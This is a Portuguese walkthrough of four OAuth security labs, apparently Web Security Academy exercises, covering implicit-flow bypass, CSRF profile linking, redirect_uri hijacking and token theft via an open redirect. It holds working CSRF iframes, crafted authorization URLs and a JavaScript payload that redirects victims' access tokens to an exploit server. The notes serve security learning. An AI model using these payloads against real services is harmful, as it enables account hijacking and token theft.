# OAuth

<br>

## Laboratórios

**Authentication Bypass via OAuth Implicit Flow**

Intercepte todo o processo de autenticação por oAuth e observe que a request POST /authenticate contém um e-mail.

Troque-o para o e-mail da vítima e abra o resultado dessa request no navegador.

<br>
<br>

**Forced OAuth Profile Linking**

Analise o preceso de anexar mídia social e observe que a request com o código `oauth` não possui o parâmetro `state`.
```
/oauth-linking?code=f4vwrTOuewZl1c57xpceroEU5sItRCyy9mFjxCLhmk1
```

Começe um processo para linkar a social media, pegue o código `oauth` e drope a request para não utilizá-lo.

Crie um iframe para explorar isso com CSRF:
```
<iframe src="https://0abc003804e351ab8225664700de000f.web-security-academy.net/oauth-linking?code=f4vwrTOuewZl1c57xpceroEU5sItRCyy9mFjxCLhmk1"></iframe>
```

<br>
<br>

**OAuth Account Hijacking via redirect_uri**

Mude o redirect_uri para o servidor de exploit.

O CSRF será:
```
<iframe src="https://oauth-0a64002304635a12826490d402450089.oauth-server.net/auth?client_id=b6ajkjihwmqj6pxjov0z8&redirect_uri=https://exploit-0ad100fa040b5a2c82f7918c01ce0085.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

Utilize o token capturado para logar em:
```
https://your-lab-id.web-security-academy.net/oauth-callback?code=CODE
```

<br>
<br>

**Stealing OAuth Access Tokens via an Open Redirect**

Confirme que o parâmetro `redirect_uri` está vulnerável a path traversal:
```
https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1
```

Encontre o Open Redirect em `GET /post/next?path=[...]` e use-o para redirecioanr o usuário para o servidor de exploit.
```
https://oauth-0a6e00b1037acb5488803fab02f200d8.oauth-server.net/auth?client_id=j03v9dtv262k7l0vkb1uu&redirect_uri=https://0a9600540369cbe58856410e00a700c7.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a44004e0379cbe5887d403b01db00d7.exploit-server.net/exploit&response_type=token&nonce=376828613&scope=openid%20profile%20email
```

O seguinte script vai vazar o access token no parâmetro da URL ao redirecionar usuarios para o servidor de exploit por um segundo:
```html
<script>
window.location = '/?'+document.location.hash.substr(1)
</script>
```

Agora precisamos criar um exploit que primeiro força a vítima a visitar a URL maliciosa e depois executar o script para roubar o access token:
```html
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```

No Repeater, vá para a request GET /me e substitua o token no header Authorization: Bearer com o que você acabou de copiar para obter a chave de API da vítima.
